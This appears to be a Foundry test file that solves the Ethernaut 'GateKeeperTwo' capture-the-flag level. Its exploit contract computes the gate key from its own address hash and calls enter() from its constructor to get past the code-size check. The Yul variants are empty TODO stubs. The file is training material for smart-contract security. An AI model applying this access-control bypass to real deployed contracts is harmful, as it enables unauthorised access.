// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {IGateKeeperTwo} from "ethernaut/IGateKeeperTwo.sol";
import {BaseTest} from "./BaseTest.t.sol";

contract GateKeeperTwoExploit {
    constructor(IGateKeeperTwo gateKeeperTwoInstance) {
        uint64 _a = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        uint64 _gateKey = (_a ^ type(uint64).max);
        gateKeeperTwoInstance.enter(bytes8(_gateKey));
    }
}

contract GateKeeperTwoExploitYul {
    constructor(IGateKeeperTwo gateKeeperTwoInstance) {
        // uint64 _a = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        // uint64 _gateKey = (_a ^ type(uint64).max);
        // gateKeeperTwoInstance.enter(bytes8(_gateKey));
        // TODO: Assembly
    }
}

contract GateKeeperTwoTest is BaseTest {
    IGateKeeperTwo public gateKeeperTwoInstance = IGateKeeperTwo(0xd62aC5FA877956BDB0563A906A55dB0339A6F6B3);

    function setUp() public override {
        super.setUp();
    }

    function exploitSol() internal override {
        new GateKeeperTwoExploit(gateKeeperTwoInstance);
    }

    function testExploitSol() public override {
        exploitSol();
        assertEq(gateKeeperTwoInstance.entrant(), tx.origin);
    }

    function exploitYul() internal override {
        bytes memory initCode = type(GateKeeperTwoExploit).creationCode;
        // TODO: Assembly
        assembly {}
    }

    function testExploitYul() public override {
        exploitYul();
    }
}
